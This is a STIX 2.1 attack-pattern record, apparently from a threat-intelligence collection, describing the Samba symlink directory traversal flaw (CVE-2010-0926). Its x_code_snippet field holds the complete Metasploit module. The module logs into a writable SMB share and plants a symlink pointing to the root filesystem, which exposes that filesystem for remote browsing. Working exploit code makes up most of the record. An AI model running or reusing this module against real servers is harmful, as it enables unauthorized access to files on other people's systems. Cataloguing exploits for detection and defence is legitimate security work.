{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa40b1a8-6a02-4088-a40c-40b0745fe760",
    "created": "2024-08-14T16:24:19.632536Z",
    "modified": "2024-08-14T16:24:19.632539Z",
    "name": "Samba Symlink Directory Traversal",
    "description": "Q This module exploits a directory traversal flaw in the Samba CIFS server. To exploit this flaw, a writeable share must be specified. The newly created directory will link to the root filesystem. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/samba_symlink_traversal.rb",
            "external_id": "samba_symlink_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0926"
        },
        {
            "source_name": "reference",
            "url": "http://www.samba.org/samba/news/symlink_attack.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Report\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::SimpleClient\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n\n\n  def initialize\n    super(\n      'Name'        => 'Samba Symlink Directory Traversal',\n      'Description' => %Q{\n        This module exploits a directory traversal flaw in the Samba\n      CIFS server. To exploit this flaw, a writeable share must be specified.\n      The newly created directory will link to the root filesystem.\n      },\n      'Author'      =>\n        [\n          'kcope', # http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072927.html\n          'hdm'    # metasploit module\n        ],\n      'References'  =>\n        [\n          ['CVE', '2010-0926'],\n          ['OSVDB', '62145'],\n          ['URL', 'http://www.samba.org/samba/news/symlink_attack.html']\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),\n      OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])\n    ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n\n  def run\n    print_status(\"Connecting to the server...\")\n    connect(versions: [1])\n    smb_login()\n\n    print_status(\"Trying to mount writeable share '#{datastore['SMBSHARE']}'...\")\n    self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}\")\n\n    print_status(\"Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...\")\n    self.simple.client.symlink(datastore['SMBTARGET'], \"../\" * 10)\n\n    print_status(\"Now access the following share to browse the root filesystem:\")\n    print_status(\"\\t\\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}\\\\#{datastore['SMBTARGET']}\\\\\")\n    print_line(\"\")\n  end\nend\n"
}